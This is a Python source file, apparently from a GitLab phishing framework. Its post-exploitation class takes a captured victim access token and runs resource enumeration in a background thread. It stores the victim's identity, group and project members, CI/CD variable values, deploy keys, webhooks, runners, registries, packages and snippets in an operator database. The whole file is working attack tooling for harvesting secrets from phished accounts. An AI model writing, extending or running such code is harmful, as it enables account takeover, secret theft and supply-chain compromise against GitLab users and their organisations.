"""
Post-Exploitation module for the GitLab Phishing Framework.

This module handles all post-exploitation tasks after a token is captured,
including resource enumeration.
"""

import logging
import threading
from typing import Optional

from ..models import Config, OperationPhase
from ..db import Database
from .resource_enumerator import ResourceEnumerator


logger = logging.getLogger(__name__)


class PostExploitation:
    """
    Handles post-exploitation workflow after token capture.
    
    This class orchestrates resource enumeration in a separate thread 
    to avoid blocking the main server.
    """
    
    def __init__(self, config: Config, db: Database):
        """
        Initialize the Post-Exploitation module.
        
        Args:
            config: Framework configuration
            db: Database instance
        """
        self.config = config
        self.db = db
        self.resource_enumerator = ResourceEnumerator(config)
        
        logger.info("PostExploitation module initialized")
    
    def start_workflow(self, operation_id: int, victim_id: int, 
                      access_token: str, refresh_token: Optional[str],
                      base_url: str, scope: str) -> None:
        """
        Start the post-exploitation workflow in a background thread.
        
        Args:
            operation_id: ID of the operation
            victim_id: ID of the victim
            access_token: Captured access token
            refresh_token: Captured refresh token (optional)
            base_url: GitLab instance base URL
            scope: Token scope
        """
        logger.info(f"Starting post-exploitation workflow for victim {victim_id}")
        
        # Run in a separate thread to avoid blocking
        thread = threading.Thread(
            target=self._run_workflow,
            args=(operation_id, victim_id, access_token, refresh_token, base_url, scope),
            daemon=True,
            name=f"PostExploit-{victim_id}"
        )
        thread.start()
        
        logger.info(f"Post-exploitation thread started for victim {victim_id}")
    
    def _run_workflow(self, operation_id: int, victim_id: int,
                     access_token: str, refresh_token: Optional[str],
                     base_url: str, scope: str) -> None:
        """
        Execute the post-exploitation workflow.
        
        This method runs in a background thread and performs resource enumeration.
        
        Args:
            operation_id: ID of the operation
            victim_id: ID of the victim
            access_token: Captured access token
            refresh_token: Captured refresh token (optional)
            base_url: GitLab instance base URL
            scope: Token scope
        """
        try:
            # Resource Enumeration
            self._enumerate_resources(operation_id, victim_id, access_token, base_url)
            
            # Mark as completed
            self.db.update_operation_status(
                operation_id,
                OperationPhase.COMPLETED.value
            )
            
            logger.info(f"Post-exploitation workflow completed for victim {victim_id}")
        
        except Exception as e:
            error_msg = f"Error in post-exploitation workflow: {str(e)}"
            logger.exception(error_msg)
            
            try:
                self.db.log_activity(
                    operation_id,
                    "post_exploitation_error",
                    error_msg
                )
                self.db.update_operation_status(
                    operation_id,
                    OperationPhase.ERROR.value
                )
            except:
                pass
    
    def _enumerate_resources(self, operation_id: int, victim_id: int,
                            access_token: str, base_url: str) -> None:
        """
        Enumerate GitLab resources for the victim.
        
        Args:
            operation_id: ID of the operation
            victim_id: ID of the victim
            access_token: Access token
            base_url: GitLab instance base URL
        """
        logger.info(f"Starting resource enumeration for victim {victim_id}")
        self.db.update_operation_status(
            operation_id,
            OperationPhase.ENUMERATING.value
        )
        
        try:
            enumeration_result = self.resource_enumerator.enumerate_all(
                operation_id,
                victim_id,
                access_token,
                base_url
            )
            
            # Store enumeration results (even if partial)
            if enumeration_result.data:
                enum_data = enumeration_result.data
                
                # Update victim info
                if enum_data.get('user_info'):
                    user_info = enum_data['user_info']
                    self.db.update_victim_info(
                        victim_id,
                        username=user_info.get('username'),
                        email=user_info.get('email'),
                        user_id=user_info.get('user_id')
                    )
                    logger.info(f"Victim info updated: {user_info.get('username')}")
                
                # Store groups
                if enum_data.get('groups'):
                    for group in enum_data['groups']:
                        group_db_id = self.db.store_group(victim_id, group)
                        
                        # Store group members if available
                        group_gitlab_id = group.get('id')
                        if group_gitlab_id in enum_data.get('group_members', {}):
                            for member in enum_data['group_members'][group_gitlab_id]:
                                self.db.store_group_member(group_db_id, member)
                    
                    logger.info(f"Stored {len(enum_data['groups'])} groups for victim {victim_id}")
                
                # Store projects
                if enum_data.get('projects'):
                    for project in enum_data['projects']:
                        project_db_id = self.db.store_project(victim_id, project)
                        project_gitlab_id = project.get('id')
                        
                        # Store CI/CD variables if available
                        if project_gitlab_id in enum_data.get('ci_variables', {}):
                            for variable in enum_data['ci_variables'][project_gitlab_id]:
                                self.db.store_ci_variable(
                                    project_db_id,
                                    variable['key'],
                                    variable.get('value'),
                                    variable.get('masked', False),
                                    variable.get('protected', False)
                                )
                        
                        # Store project members if available
                        if project_gitlab_id in enum_data.get('project_members', {}):
                            for member in enum_data['project_members'][project_gitlab_id]:
                                self.db.store_project_member(project_db_id, member)
                        
                        # Store merge requests if available
                        if project_gitlab_id in enum_data.get('merge_requests', {}):
                            for mr in enum_data['merge_requests'][project_gitlab_id]:
                                self.db.store_merge_request(project_db_id, mr)
                        
                        # Store issues if available
                        if project_gitlab_id in enum_data.get('issues', {}):
                            for issue in enum_data['issues'][project_gitlab_id]:
                                self.db.store_issue(project_db_id, issue)
                        
                        # Store deploy keys if available
                        if project_gitlab_id in enum_data.get('deploy_keys', {}):
                            for key in enum_data['deploy_keys'][project_gitlab_id]:
                                self.db.store_deploy_key(project_db_id, key)
                        
                        # Store webhooks if available
                        if project_gitlab_id in enum_data.get('webhooks', {}):
                            for hook in enum_data['webhooks'][project_gitlab_id]:
                                self.db.store_webhook(project_db_id, hook)
                        
                        # Store protected branches if available
                        if project_gitlab_id in enum_data.get('protected_branches', {}):
                            for branch in enum_data['protected_branches'][project_gitlab_id]:
                                self.db.store_protected_branch(project_db_id, branch)
                        
                        # Store runners if available
                        if project_gitlab_id in enum_data.get('runners', {}):
                            for runner in enum_data['runners'][project_gitlab_id]:
                                self.db.store_runner(project_db_id, runner)
                        
                        # Store container registries if available
                        if project_gitlab_id in enum_data.get('container_registries', {}):
                            for registry in enum_data['container_registries'][project_gitlab_id]:
                                self.db.store_container_registry(project_db_id, registry)
                        
                        # Store packages if available
                        if project_gitlab_id in enum_data.get('packages', {}):
                            for package in enum_data['packages'][project_gitlab_id]:
                                self.db.store_package(project_db_id, package)
                    
                    logger.info(f"Stored {len(enum_data['projects'])} projects for victim {victim_id}")
                
                # Store snippets
                if enum_data.get('snippets'):
                    for snippet in enum_data['snippets']:
                        self.db.store_snippet(victim_id, snippet)
                    logger.info(f"Stored {len(enum_data['snippets'])} snippets for victim {victim_id}")
                
                # Log enumeration result
                if enumeration_result.success:
                    self.db.log_activity(
                        operation_id,
                        "enumeration_complete",
                        f"Enumeration completed: {len(enum_data.get('projects', []))} projects discovered"
                    )
                else:
                    # Partial success
                    self.db.log_activity(
                        operation_id,
                        "enumeration_partial",
                        f"Enumeration partially completed: {len(enum_data.get('projects', []))} projects, "
                        f"{len(enum_data.get('errors', []))} errors"
                    )
            else:
                logger.warning(f"Enumeration failed for victim {victim_id}: {enumeration_result.error}")
                self.db.log_activity(
                    operation_id,
                    "enumeration_failed",
                    f"Enumeration failed: {enumeration_result.error}"
                )
        
        except Exception as e:
            error_msg = f"Enumeration failed with exception: {str(e)}"
            logger.error(error_msg, exc_info=True)
            self.db.log_activity(
                operation_id,
                "enumeration_error",
                error_msg
            )
    

